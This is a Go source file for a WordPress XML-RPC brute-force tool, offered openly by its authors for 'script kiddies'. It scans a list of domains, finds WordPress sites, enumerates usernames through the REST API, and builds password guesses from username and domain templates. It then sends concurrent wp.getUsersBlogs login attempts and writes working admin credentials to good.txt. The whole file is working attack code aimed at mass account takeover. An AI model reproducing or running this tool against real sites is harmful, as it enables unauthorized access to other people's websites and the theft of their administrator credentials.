// xmlrpc-brute golang made by https://github.com/fooster1337 & https://t.me/GrazzMean
// just use it script kiddies.
// sorry for bad code.

package main

import (
	"bufio"
	"bytes"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

// color
const (
	Reset   = "\033[0m"
	Red     = "\033[31m"
	Green   = "\033[32m"
	Yellow  = "\033[33m"
	Blue    = "\033[34m"
	Magenta = "\033[35m"
	Cyan    = "\033[36m"
	Gray    = "\033[37m"
	White   = "\033[97m"
)

const TIMEOUT_HTTP = 10 // set your timeout here.
const VERSION string = "0.1"
const AUTHOR string = "@GrazzMean"

// website list file for brute
var fileName string

// // password list for brute
var passwordList string

// thread (GOROUNTINES)
var thread int

// error message

func error_message(domain string, message string) {
	fmt.Println("[" + Yellow + "#" + Reset + "] " + domain + " --> " + "[" + Red + message + Reset + "]")
}

func success_message(domain string, message string) {
	fmt.Println("[" + Yellow + "#" + Reset + "] " + domain + " --> " + "[" + Green + message + Reset + "]")
}

func checkFileExist(filePath string) bool {
	_, error := os.Stat(filePath)

	return !errors.Is(error, os.ErrNotExist)
}

func createFile(fileName string) {
	create, err := os.Create(fileName)

	if err != nil {
		fmt.Println("Failed create file : " + err.Error())
	}

	create.Close()

}

func SaveTextToFile(message string, fileName string) {
	// if !checkFileExist(fileName) {
	// 	createFile(fileName)
	// }

	file, err := os.OpenFile(fileName, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0644)

	if err != nil {
		fmt.Println("Failed to append text " + fileName + " : " + err.Error())
		file.Close()
	} else {
		if _, err := file.Write([]byte(message + "\n")); err != nil {
			fmt.Println("Failed to append text " + fileName + " : " + err.Error())
		}
		file.Close()
	}

}

// return text from GET REQUEST
func Body_Request(url string) (string, error) {
	req, err := Get_request(url)
	if err != nil {
		return "", err
	}

	defer req.Body.Close()

	text, err := io.ReadAll(req.Body)
	if err != nil {
		return "", err
	}

	return string(text), err
}

func Status_Code_Request(url string) (int, error) {
	req, err := Get_request(url)
	if err != nil {
		return 1, err
	}

	return req.StatusCode, err
}

// check open port
func Check_Port(domain string, port int) bool {
	address := fmt.Sprintf("%s:%d", domain, port)
	conn, err := net.DialTimeout("tcp", address, TIMEOUT_HTTP*time.Second)
	if err != nil {
		//fmt.Println(err.Error())
		return false
	}
	defer conn.Close()
	return true
}

// check port for checking http/s
func Get_Scheme(domain string) string {
	var scheme string
	port := 443
	if Check_Port(domain, port) {
		scheme = "https"
	} else {
		port := 80
		if Check_Port(domain, port) {
			scheme = "http"
		}
	}

	return scheme
}

// send GET request to website
func Get_request(url string) (*http.Response, error) {
	// timeout
	client := http.Client{
		Timeout: time.Duration(TIMEOUT_HTTP) * time.Second,
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0")
	req.Header.Set("Referer", "https://google.com")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	resp, erro := client.Do(req)
	if erro != nil {
		return nil, erro
	}

	return resp, err
}

// create password list for brute force
func createPasswordList(domain string, username string) []string {
	pwList := passwordList
	// Remove scheme from domain if present
	domainNoScheme := domain
	if index := strings.Index(domain, "://"); index != -1 {
		domainNoScheme = domain[index+3:]
	}

	// Create a map of placeholders and their replacements
	replacements := map[string]string{
		"[UPPERLOGIN]":  strings.ToUpper(username),
		"[WPLOGIN]":     username,
		"[DOMAIN]":      domainNoScheme,
		"[UPPERDOMAIN]": strings.ToUpper(domainNoScheme),
		"[FULLDOMAIN]":  domain,
	}

	// Replace all placeholders in the password list
	for placeholder, replacement := range replacements {
		pwList = strings.ReplaceAll(pwList, placeholder, replacement)
	}

	split := strings.Split(pwList, "\n")

	for i, word := range split {
		split[i] = strings.TrimSpace(word)
	}
	// Split the password list into individual passwords
	return split
}

func Post_Request(url string, Payload []byte) (string, error) {
	// timeout
	client := http.Client{
		Timeout: time.Duration(TIMEOUT_HTTP) * time.Second,
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(Payload))

	if err != nil {
		return "", err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0")
	req.Header.Set("Content-Type", "text/xml")

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}

	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)

	if err != nil {
		return "", err
	}

	return string(body), err

}

// read file and return as string
func readFileToString(fileName string) (string, error) {
	data, err := ioutil.ReadFile(fileName)

	if err != nil {
		return "", err
	}

	return string(data), err
}

// read file and return as list (read by line)
func readFileToList(fileName string) []string {
	DomainList := []string{}
	readFile, err := os.Open(fileName)

	if err != nil {
		fmt.Println("Failed open file : " + err.Error())
		return DomainList
	}

	fileScanner := bufio.NewScanner(readFile)
	fileScanner.Split(bufio.ScanLines)

	for fileScanner.Scan() {
		DomainList = append(DomainList, fileScanner.Text())
	}

	readFile.Close()

	return DomainList
}

// clear ah terminal
func clear_terminal() {
	var command string
	// clear screen windows
	if runtime.GOOS == "windows" {
		command = "cls"
	} else {
		// clear screen unix-like (MacOS, Linux, and friend :) )
		command = "clear"
	}

	// exec command
	cmd := exec.Command(command)
	cmd.Stdout = os.Stdout
	cmd.Run()
}

// get username from website
func Get_Username(domain string) []string {
	var username []string
	domainReq := domain + "/wp-json/wp/v2/users"

	for {
		text, err := Body_Request(domainReq)
		if err != nil {
			error_message(domainReq, err.Error())
			return username
		}

		if strings.Contains(text, "slug") {
			// regex for get username
			var regex, err = regexp.Compile(`"slug":"(.*?)"`)
			if err != nil {
				fmt.Println(Red + "Regex Error" + Reset + " : " + err.Error())
			}
			matches := regex.FindAllStringSubmatch(text, -1)
			if matches != nil {
				for _, match := range matches {
					// match[0] is the full match, match[1] is the value captured by the first group
					username = append(username, match[1])
				}
			}

			break
		} else {
			// method 2 if wp-json 404 not found
			domainReq = domain + "/index.php/wp-json/wp/v2/users"
		}
	}
	// if anyone know how to detect redirect url tell me @GrazzMean
	// to method 2
	// } else {
	// id := 1
	// for {
	// 	resp, err := Get_request(domain + fmt.Sprintf("/?author=%d", id))
	// 	//fmt.Println(resp)
	// 	if err != nil {
	// 		break
	// 	}

	// 	defer resp.Body.Close()

	// 	// Check if the response is a redirect
	// 	//if resp.StatusCode >= 300 && resp.StatusCode < 400 {
	// 	// location, err := resp.Request.Host()
	// 	// fmt.Println(location)
	// 	// if err != nil {
	// 	// 	break
	// 	// }
	// 	// fmt.Println(location.String())
	// 	// fmt.Println(resp.Host)
	// 	//} else {
	// 	//	break
	// 	//}
	// 	location := resp.Header.Get("Location")
	// 	if len(location) > 0 {
	// 		fmt.Println(location)
	// 	} else {
	// 		fmt.Println("Ga ada gan")
	// 		break
	// 	}

	// 	id++
	// }
	//}

	return username
}

// check if website is wordpress
func isWordpress(domain string) bool {
	text, err := Body_Request(domain)
	if err != nil {
		error_message(domain, err.Error())
		return false
	}

	if strings.Contains(text, "/wp-includes/") {
		success_message(domain, "Wordpress")
		return true
	} else {
		statusCode, err := Status_Code_Request(domain + "/wp-content/")
		if err != nil {
			error_message(domain, err.Error())
			return false
		}

		if statusCode == 200 {
			success_message(domain, "Wordpress")
			return true
		}
	}

	error_message(domain, "Wordpress")
	return false

}

// check if XMLRPC is enable & can handle POST
func isVulnXMLRPC(domain string) bool {
	domain = domain + "/xmlrpc.php"
	data, err := Body_Request(domain)
	if err != nil {
		error_message(domain, err.Error())
		return false
	}
	if strings.Contains(data, "XML-RPC server accepts POST requests only.") {
		// payload
		payload := `<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>`
		post, e := Post_Request(domain, []byte(payload))
		if e != nil {
			error_message(domain, "XML-RPC")
			return false
		}

		if strings.Contains(post, "wp.getUsersBlogs") {
			return true
		}

		return false
	} else {
		error_message(domain, "XML-RPC")
	}

	return false

}

func ParseDomain(domain string) string {
	if !(strings.Contains(domain, "://")) {
		domain = "http://" + domain
	}

	var u, e = url.Parse(domain)
	if e != nil {
		error_message(domain, e.Error())
		return ""
	}

	scheme := Get_Scheme(u.Host)
	if !(len(scheme) > 0) {
		return ""
	}

	domain = scheme + "://" + u.Host
	if len(u.Path) > 0 {
		domain = scheme + "://" + u.Host + "/" + u.Path
	}

	return domain
}

func removeDuplicatesFromList(value []string) []string {
	encoutered := map[string]bool{}
	result := []string{}

	for v := range value {
		if !(encoutered[value[v]]) {
			encoutered[value[v]] = true
			result = append(result, value[v])
		}
	}

	return result
}

func splitStringIntoList(content string) []string {
	// var result []string
	result := strings.Split(content, "\n")
	return result
}

func BruteForceXmlrpc(domain string, usernameList []string, passwordList []string) {
	payload := `<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>`

	results := make(chan string)
	var wg sync.WaitGroup

	for _, user := range usernameList {
		userFound := false

		for _, password := range passwordList {
			if userFound {
				continue
			}

			wg.Add(1)
			go func(user, password string) {
				defer wg.Done()

				body := fmt.Sprintf(payload, user, password)
				text, err := Post_Request(domain+"/xmlrpc.php", []byte(body))
				if err != nil {
					results <- fmt.Sprintf("[ \033[33mXMLRPC\033[0m ] %s --> [\033[31m%s\033[0m]\n", domain, err.Error())
					return
				}

				if strings.Contains(text, "<member><name>isAdmin</name><value>") {
					results <- fmt.Sprintf("[ \033[33mXMLRPC\033[0m ] %s --> [\033[32m%s|%s\033[0m]\n", domain, user, password)
					SaveTextToFile(domain+"/wp-login.php#"+user+"@"+password, "good.txt")
					userFound = true
				} else {
					results <- fmt.Sprintf("[ \033[33mXMLRPC\033[0m ] %s --> [\033[31m%s|\033[31m%s\033[0m]\n", domain, user, password)
				}
			}(user, password)
		}
	}

	// Close the results channel after all goroutines finish
	go func() {
		wg.Wait()
		close(results)
	}()

	// Print results
	for result := range results {
		fmt.Print(result)
	}
}

// prepare before brute
// ch chan<- string
func brutePrepare(url string, ch chan<- string) {
	// passwordList, e := readFileToString("top-830_MCR.txt")
	// if e != nil {
	// 	fmt.Println("hello")
	// }
	var usernameList []string
	// parse domain first
	domain := ParseDomain(url)
	if !(len(domain) > 0) {
		error_message(url, "Failed_Parse")
		return
	}

	if isWordpress(domain) {
		SaveTextToFile(domain, "wordpress.txt")
		if isVulnXMLRPC(domain) {
			success_message(domain, "XML-RPC")
			usernameList = Get_Username(domain)
			if len(usernameList) > 0 {
				var pwList []string

				for _, user := range usernameList {
					pwList = append(pwList, createPasswordList(domain, user)...)
				}
				//fmt.Println(createPasswordList("google.com", "kontol"))

				pwList = removeDuplicatesFromList(pwList)
				// fmt.Println(pwList)
				// fmt.Println(len(pwList))
				BruteForceXmlrpc(domain, usernameList, pwList)
			} else {
				error_message(domain, "Username_Not_Found")
			}
		}
	}
}

// start the game
func start(domains []string, thread int) {
	var wg sync.WaitGroup
	ch := make(chan string)

	// Add the number of goroutines to the wait group
	wg.Add(thread)

	for i := 0; i < thread; i++ {
		go func() {
			defer wg.Done() // Decrement the wait group counter when the goroutine finishes
			for domain := range ch {
				brutePrepare(domain, ch)
			}
		}()
	}

	for _, domain := range domains {
		ch <- domain
	}

	close(ch)

	// Wait for all goroutines to finish
	wg.Wait()
}

// func main() {
// 	brutePrepare("http://localhost/wordpress")
// }

func main() {
	clear_terminal()
	// CreateFolder()
	// var fileName string
	var thread int
	var passwordListFile string
	// Linux logo is very cute.
	const BANNER = `
________________________
< Hack The Fucking World >
------------------------
        \\
         \\
             .--.
            |o_o |
            |:_/ |
           //   \ \\
          (|     | )
         /'\_   _/'\
         \___)=(___/
    `
	fmt.Println(BANNER)
	fmt.Println(Yellow + "\tXML-RPC BRUTE FORCE\n" + Reset)
	fmt.Println(":: Author  : " + Blue + "https://github.com/fooster1337" + Reset + " & " + Blue + "@GrazzMean" + Reset)
	fmt.Println(":: Version : " + Yellow + VERSION + Reset + "\n")
	args := os.Args

	if len(args) < 4 {
		fmt.Print("[?] Domain List : ")
		fmt.Scan(&fileName)
		fmt.Print("[?] Password List : ")
		fmt.Scan(&passwordListFile)
		fmt.Print("[?] Thread (Goroutines/Concurrent) : ")
		fmt.Scan(&thread)
	} else {
		fileName = args[1]
		passwordListFile = args[2]
		threadStr := args[3]
		threadInt, e := strconv.Atoi(threadStr)
		if e != nil {
			fmt.Println("Error : " + e.Error())
			os.Exit(1)
		}
		thread = threadInt
	}

	domainList := readFileToList(fileName)

	pwList, err := readFileToString(passwordListFile)
	if err != nil {
		fmt.Println("Error : " + err.Error())
		os.Exit(1)
	}

	passwordList = pwList

	// remove duplicate first
	domainList = removeDuplicatesFromList(domainList)
	start(domainList, thread)

}
